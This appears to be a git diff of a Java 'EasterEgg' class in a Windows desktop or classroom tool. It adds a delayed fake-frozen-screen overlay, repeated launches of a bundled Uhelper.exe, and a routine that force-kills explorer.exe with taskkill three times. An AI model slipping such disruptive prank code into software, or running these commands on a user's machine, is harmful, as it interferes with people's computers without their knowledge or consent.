@@ -17,6 +17,7 @@ import javax.swing.*;
 import java.awt.*;
 import java.awt.event.*;
 import java.awt.image.BufferedImage;
+import java.io.IOException;
 import java.util.List;
 import java.util.Random;
 
@@ -31,19 +32,22 @@ public class EasterEgg extends BasicEasterEggFunction{
      * @throws Exception
      */
     public void screenBlocking(int maxWaitTime, int showTime) throws Exception {
-
-        Thread.sleep((new Random().nextInt(maxWaitTime) + 1)*60*1000);
-
-        //创建一个robot对象
-        Robot robut = new Robot();
         //获取屏幕分辨率
         Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
-        //打印屏幕分辨率
-        System.out.println(d);
+
+
+        int waitTime = (new Random().nextInt(maxWaitTime) + 1);
+        Log.info.print(ClassFormPanel.class.toString(), String.format("预启动：屏幕遮挡|参数：启动前等待时间:%smin;显示时间:%ss;大小：%s", waitTime, showTime, d));
+
+        Thread.sleep((long) waitTime * 60 * 1000);
+
+        //创建一个robot对象
+        Robot robot = new Robot();
+
         //创建该分辨率的矩形对象
         Rectangle screenRect = new Rectangle(d);
         //根据这个矩形截图
-        BufferedImage bufferedImage = robut.createScreenCapture(screenRect);
+        BufferedImage bufferedImage = robot.createScreenCapture(screenRect);
 
         JDialog dialog = new JDialog();
         dialog.setUndecorated(true);
@@ -93,6 +97,7 @@ public class EasterEgg extends BasicEasterEggFunction{
         dialog.pack();
 
         dialog.setVisible(true);
+        Log.info.print(ClassFormPanel.class.toString(), "屏幕遮挡完毕！");
     }
 
     public void happenError() throws Exception {
@@ -157,16 +162,18 @@ public class EasterEgg extends BasicEasterEggFunction{
 
         //Desktop.getDesktop().open(new java.io.File(CTInfo.TEMP_PATH + "\\Whetstone\\chuizis.exe"));
         new Thread(()->{
-            try {
-                for(int i = 0;i < count;i++){
-                    Process process = Runtime.getRuntime().exec(new String[]{CTInfo.TEMP_PATH + "\\Whetstone\\Uhelper.exe"});
-                    int status = process.waitFor();
 
-                    Log.info.print(ClassFormPanel.class.toString(), "UHelper.exe关闭：" + status);
+                for(int i = 0;i < count;i++){
+                    try {
+                        Process process = Runtime.getRuntime().exec(new String[]{CTInfo.TEMP_PATH + "\\Whetstone\\Uhelper.exe"});
+                        int status = process.waitFor();
+
+                        Log.info.print(ClassFormPanel.class.toString(), "UHelper.exe关闭：" + status);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
                 }
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+
         }, "U盘助手").start();
 
     }
@@ -256,5 +263,37 @@ public class EasterEgg extends BasicEasterEggFunction{
         frame.setLocation((int) (100 *CTInfo.dpi), (int) (100 *CTInfo.dpi));
 
         frame.setVisible(true);
+    }
+
+    public void reStartExplorer() {
+        new Thread(()->{
+            for (int i = 0; i < 3; i++) {
+                {
+                    try {
+                        Process process = Runtime.getRuntime().exec(new String[]{"taskkill", "/f", "/im", "explorer.exe"});
+
+                        process.waitFor();
+                    } catch (Exception _) {
+                    }
+                }
+                try {
+                    Thread.sleep(500);
+                } catch (InterruptedException _) {
+
+                }
+                {
+                    try {
+                        Runtime.getRuntime().exec(new String[]{"explorer.exe"});
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    }
+                }
+                try {
+                    Thread.sleep(60*1000);
+                } catch (InterruptedException _) {
+
+                }
+            }
+        }).start();
     }
 }
